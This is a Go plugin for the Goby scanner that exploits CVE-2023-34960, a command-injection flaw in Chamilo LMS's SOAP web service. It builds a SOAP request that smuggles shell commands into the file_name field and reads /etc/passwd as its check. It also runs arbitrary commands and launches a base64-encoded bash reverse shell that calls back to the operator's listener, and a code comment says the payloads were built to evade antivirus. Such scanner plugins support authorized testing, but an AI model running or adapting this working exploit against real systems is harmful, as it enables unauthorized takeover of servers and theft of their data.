package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Chamilo LMS /main/webservices/additional_webservices.php command execute Vulnerability (CVE-2023-34960)",
    "Description": "<p>Chamilo is an open source learning management system designed to provide a powerful, easy-to-use online learning platform for educational institutions, corporations, and individuals. This vulnerability can be exploited to execute arbitrary code on the server side, write to a backend, gain server privileges, and then take control of the entire web server.</p>",
    "Product": "Chamilo",
    "Homepage": "http://www.chamilo.org/",
    "DisclosureDate": "2023-06-22",
    "PostTime": "2024-03-26",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "banner=\"X-Powered-By: Chamilo\" || header=\"X-Powered-By: Chamilo\"",
    "GobyQuery": "banner=\"X-Powered-By: Chamilo\" || header=\"X-Powered-By: Chamilo\"",
    "Level": "3",
    "Impact": "<p>This vulnerability can be exploited to execute arbitrary code on the server side, write to a backend, gain server privileges, and then take control of the entire web server.</p>",
    "Recommendation": "<p>1. Officials have not fixed the vulnerability yet, please contact the vendor to fix the vulnerability: <a href=\"https://chamilo.org\">https://chamilo.org</a></p><p>2. Set up access policies and whitelist access through firewalls and other security devices.</p><p>3. If not necessary, prohibit access to the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "reverse_linux,reverse_windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/main/webservices/additional_webservices.php",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
                    "Accept": "*/*",
                    "Content-Type": "text/xml; charset=utf-8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/main/webservices/additional_webservices.php",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/main/webservices/additional_webservices.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-34960"
    ],
    "CNNVD": [
        "CNNVD-202308-007"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Chamilo LMS /main/webservices/additional_webservices.php 命令执行漏洞 (CVE-2023-34960)",
            "Product": "Chamilo",
            "Description": "<p>Chamilo 是一个开源的学习管理系统，旨在为教育机构、企业和个人提供一个功能强大、易于使用的在线学习平台。攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>1. 官方暂未修复该漏洞，请用户联系厂商修复该漏洞：<a href=\"https://chamilo.org\">https://chamilo.org</a></p><p>2. 通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(8, 8, 8); font-size: 14px;\">攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Chamilo LMS /main/webservices/additional_webservices.php command execute Vulnerability (CVE-2023-34960)",
            "Product": "Chamilo",
            "Description": "<p>Chamilo is an open source learning management system designed to provide a powerful, easy-to-use online learning platform for educational institutions, corporations, and individuals. This vulnerability can be exploited to execute arbitrary code on the server side, write to a backend, gain server privileges, and then take control of the entire web server.<br></p>",
            "Recommendation": "<p>1. Officials have not fixed the vulnerability yet, please contact the vendor to fix the vulnerability: <a href=\"https://chamilo.org\">https://chamilo.org</a></p><p>2. Set up access policies and whitelist access through firewalls and other security devices.</p><p>3. If not necessary, prohibit access to the system from the public network.</p>",
            "Impact": "<p>This vulnerability can be exploited to execute arbitrary code on the server side, write to a backend, gain server privileges, and then take control of the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10938"
}`
	uploadFilepoliteJUS32 := func(hostInfo *httpclient.FixUrl, command string) (*httpclient.HttpResponse, error) {
		// 对于同名的文件只能上传一次,否则会被更改文件名，且有的系统可以上传，但对存在文件夹路径做了鉴权处理，访问需要权限,有的有防火墙，需要做免杀，故文件上传 payload 均做了免杀。POC检测的为成功上传且可以访问的
		uploadRequestConfig := httpclient.NewPostRequestConfig("/main/webservices/additional_webservices.php")
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")
		uploadRequestConfig.Header.Store("Accept", "*/*")
		uploadRequestConfig.Header.Store("Content-Type", "text/xml; charset=utf-8")
		uploadRequestConfig.Data = "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"" + hostInfo.FixedHostInfo + "\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:ns2=\"http://xml.apache.org/xml-soap\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type=\"ns2:Map\"><item><key xsi:type=\"xsd:string\">file_data</key><value xsi:type=\"xsd:string\"></value></item><item><key xsi:type=\"xsd:string\">file_name</key><value xsi:type=\"xsd:string\">`{}`.pptx'|\" |" + command + "||a #</value></item><item><key xsi:type=\"xsd:string\">service_ppt2lp_size</key><value xsi:type=\"xsd:string\">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>"
		if resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig); resp != nil && resp.StatusCode == 200 {
			return resp, nil
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := uploadFilepoliteJUS32(hostInfo, "cat /etc/passwd")
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "/bin/bash") && !strings.Contains(resp.Utf8Html, "/usr/sbin/nologin") {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + "/main/webservices/additional_webservices.php"
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "cmd" {
				command := goutils.B2S(ss.Params["cmd"])
				if resp, _ := uploadFilepoliteJUS32(expResult.HostInfo, command); resp != nil && strings.Contains(resp.Utf8Html, "xml") {
					rawbody := regexp.MustCompile(`(<return xsi:type="xsd:string">)(.*?)(</return>)`).FindString(resp.RawBody)
					rawbody = strings.TrimLeft(strings.TrimRight(rawbody, `</return>`), `<return xsi:type="xsd:string">`)
					if rawbody != "false" {
						expResult.Success = true
						expResult.Output = rawbody
					} else {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attacktype == "reverse" {
				reverse_type := goutils.B2S(ss.Params["reverse"])
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession(reverse_type, waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "无可用反弹端口"
					return expResult
				} else {
					command := godclient.ReverseTCPByBash(rp)
					command1 := "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
					go uploadFilepoliteJUS32(expResult.HostInfo, command1)
					select {
					case webConsleID := <-waitSessionCh:
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 30):
					}
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
